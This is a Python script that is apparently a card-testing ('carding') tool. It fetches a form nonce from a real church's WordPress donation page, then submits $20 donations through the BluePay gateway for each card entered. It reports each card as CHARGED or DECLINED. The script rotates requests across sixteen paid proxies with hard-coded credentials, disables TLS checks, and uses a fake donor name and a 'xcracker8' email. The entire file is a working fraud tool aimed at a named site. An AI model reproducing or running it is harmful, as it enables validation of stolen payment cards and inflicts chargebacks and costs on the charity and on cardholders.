import requests
from bs4 import BeautifulSoup
import re
import random
import logging
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY POOL - Rotated per card
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PROXY_USERNAME = "g2rTXpNfPdcw2fzGtWKp62yH"
PROXY_PASSWORD = "nizar1elad2"

PROXY_LIST = [
    {"host": "sg-sin.pvdata.host",  "port": 8080, "tag": "SG-Singapore"},
    {"host": "jp-tok.pvdata.host",  "port": 8080, "tag": "JP-Tokyo"},
    {"host": "ph-man.pvdata.host",  "port": 8080, "tag": "PH-Manila"},
    {"host": "nz-auc.pvdata.host",  "port": 8080, "tag": "NZ-Auckland"},
    {"host": "co-bog.pvdata.host",  "port": 8080, "tag": "CO-Bogota"},
    {"host": "cl-san.pvdata.host",  "port": 8080, "tag": "CL-Santiago"},
    {"host": "il-tel.pvdata.host",  "port": 8080, "tag": "IL-TelAviv"},
    {"host": "rs-bel.pvdata.host",  "port": 8080, "tag": "RS-Belgrade"},
    {"host": "gr-ath.pvdata.host",  "port": 8080, "tag": "GR-Athens"},
    {"host": "hu-bud.pvdata.host",  "port": 8080, "tag": "HU-Budapest"},
    {"host": "lt-sia.pvdata.host",  "port": 8080, "tag": "LT-Siauliai"},
    {"host": "ro-buk.pvdata.host",  "port": 8080, "tag": "RO-Bucharest"},
    {"host": "ee-tal.pvdata.host",  "port": 8080, "tag": "EE-Tallinn"},
    {"host": "ie-dub.pvdata.host",  "port": 8080, "tag": "IE-Dublin"},
    {"host": "pt-lis.pvdata.host",  "port": 8080, "tag": "PT-Lisbon"},
    {"host": "fi-esp.pvdata.host",  "port": 8080, "tag": "FI-Espoo"},
]


class ProxyRotator:
    def __init__(self, proxies, mode="sequential"):
        self.proxies = list(proxies)
        self.mode = mode
        self.index = 0
        self.usage_count = 0
        if mode == "shuffle":
            random.shuffle(self.proxies)

    def get_next(self):
        proxy = self.proxies[self.index % len(self.proxies)]
        self.index += 1
        self.usage_count += 1
        return proxy

    def get_proxies_dict(self, proxy):
        url = f"http://{PROXY_USERNAME}:{PROXY_PASSWORD}@{proxy['host']}:{proxy['port']}"
        return {'http': url, 'https': url}

    def get_stats(self):
        return {
            "total_proxies": len(self.proxies),
            "current_index": self.index % len(self.proxies),
            "total_uses": self.usage_count,
            "mode": self.mode,
        }


proxy_rotator = ProxyRotator(PROXY_LIST, mode="sequential")


def process_bluepay_card(formatted_cc, proxy_info=None):
    """
    Processes a card via the BluePay gateway (remnanthouse.org).
    Returns a dictionary: {'status': 'charged'|'declined'|'error', 'message': '...', 'proxy': '...'}
    """
    # Rotate proxy if not provided
    if proxy_info is None:
        proxy_info = proxy_rotator.get_next()
    proxies = proxy_rotator.get_proxies_dict(proxy_info)
    tag = proxy_info.get('tag', 'UNKNOWN')

    try:
        # 1. Parse Input
        X = formatted_cc.strip()
        parts = re.split(r'[/|\s]+', X)

        if len(parts) == 4:
            cn = parts[0].strip()
            ex = parts[1].strip()
            ey = parts[2].strip()
            cvv = parts[3].strip()

            if len(ey) == 4:
                ey = ey[-2:]
        else:
            return {'status': 'ERROR', 'message': 'INVALID_FORMAT', 'proxy': tag}

        # 2. Headers for Nonce Request
        headers_nonce = {
            'Accept': '*/*',
            'Accept-Language': 'en-GB',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://remnanthouse.org',
            'Referer': 'https://remnanthouse.org/give/cheerful-giving-to-yahuah?form-id=15659&showDonationProcessingError=1&giveDonationFormInIframe=1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'save-data': 'on',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        data_nonce = {
            'action': 'give_donation_form_reset_all_nonce',
            'give_form_id': '15659',
        }

        # 3. Get Nonce
        try:
            rn = requests.post(
                'https://remnanthouse.org/disciples/wp-admin/admin-ajax.php',
                headers=headers_nonce,
                data=data_nonce,
                proxies=proxies,
                verify=False,
                timeout=15
            )
            rn_json = rn.json()
            non = rn_json.get("data", {}).get("give_form_hash")
            if not non:
                return {'status': 'ERROR', 'message': 'Failed to retrieve form nonce', 'proxy': tag}
        except Exception as e:
            return {'status': 'ERROR', 'message': f'Nonce Error: {str(e)}', 'proxy': tag}

        # 4. Headers for Payment Request
        headers_pay = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-GB',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://remnanthouse.org',
            'Referer': 'https://remnanthouse.org/give/cheerful-giving-to-yahuah?giveDonationFormInIframe=1',
            'Sec-Fetch-Dest': 'iframe',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            'save-data': 'on',
            'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }

        params = {
            'payment-mode': 'bluepay',
            'form-id': '15659',
        }

        full_year = '20' + ey if len(ey) == 2 else ey

        data_pay = {
            'give-honeypot': '',
            'give-form-id-prefix': '15659-1',
            'give-form-id': '15659',
            'give-form-title': 'Cheerful Giving To Yahuah!',
            'give-current-url': 'https://remnanthouse.org/support/',
            'give-form-url': 'https://remnanthouse.org/give/cheerful-giving-to-yahuah/',
            'give-form-minimum': '20.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': non,
            'give-price-id': 'custom',
            'give-amount': '20.00',
            'give_first': 'John',
            'give_last': 'Smitb',
            'give_email': 'xcracker8@gmail.com',
            'give_anonymous_donation': '1',
            'give_comment': '',
            'payment-mode': 'bluepay',
            'card_number': cn,
            'card_cvc': cvv,
            'card_name': 'John',
            'card_exp_month': ex,
            'card_exp_year': full_year,
            'card_expiry': f"{ex} / {ey}",
            'give_action': 'purchase',
            'give-gateway': 'bluepay',
            'give_embed_form': '1',
        }

        # 5. Submit Payment
        r1 = requests.post(
            'https://remnanthouse.org/give/cheerful-giving-to-yahuah/',
            params=params,
            headers=headers_pay,
            data=data_pay,
            proxies=proxies,
            verify=False,
            timeout=20
        )

        # 6. Parse Response
        soup = BeautifulSoup(r1.text, "html.parser")
        error_div = soup.find("div", class_="give_error")

        if error_div:
            error_msg = error_div.get_text(strip=True)
            return {'status': 'DECLINED', 'message': error_msg, 'proxy': tag}
        elif "<title>Donation Receipt</title>" in r1.text:
            return {'status': 'CHARGED', 'message': 'Transaction Processed Successfully', 'proxy': tag}
        elif "Donation submitted successfully!" in r1.text:
            return {'status': 'CHARGED', 'message': 'Donation submitted successfully!', 'proxy': tag}
        else:
            return {'status': 'ERROR', 'message': 'Unknown Gateway Response', 'proxy': tag}

    except requests.exceptions.Timeout:
        return {'status': 'ERROR', 'message': 'Gateway Timeout', 'proxy': tag}
    except Exception as e:
        return {'status': 'ERROR', 'message': f'Processing Error: {str(e)}', 'proxy': tag}


def main():
    print("\n" + "="*60)
    print("  BLUEPAY CHECKOUT PROCESSOR  ─  PROXY ROTATION")
    print("="*60)
    stats = proxy_rotator.get_stats()
    print(f"  Proxies loaded: {stats['total_proxies']}  |  Mode: {stats['mode'].upper()}")
    print("="*60 + "\n")

    while True:
        try:
            card_input = input("Card (number|mm|yy|cvv): ").strip()
            if not card_input:
                print("Please enter card details!")
                continue
            if card_input.lower() in ['exit', 'quit', 'q']:
                break

            proxy_info = proxy_rotator.get_next()
            result = process_bluepay_card(card_input, proxy_info=proxy_info)

            next_idx = proxy_rotator.get_stats()['current_index'] % len(PROXY_LIST)
            next_tag = PROXY_LIST[next_idx]['tag']

            print("\n" + "-"*60)
            print(f"  Proxy   : {result.get('proxy', 'N/A')} ({proxy_info['host']}:{proxy_info['port']})")
            print(f"  Status  : {result.get('status', 'unknown').upper()}")
            print(f"  Message : {result.get('message', 'N/A')}")
            print(f"  Next    : #{next_idx + 1} {next_tag}")
            print("-"*60 + "\n")

        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")


if __name__ == "__main__":
    main()
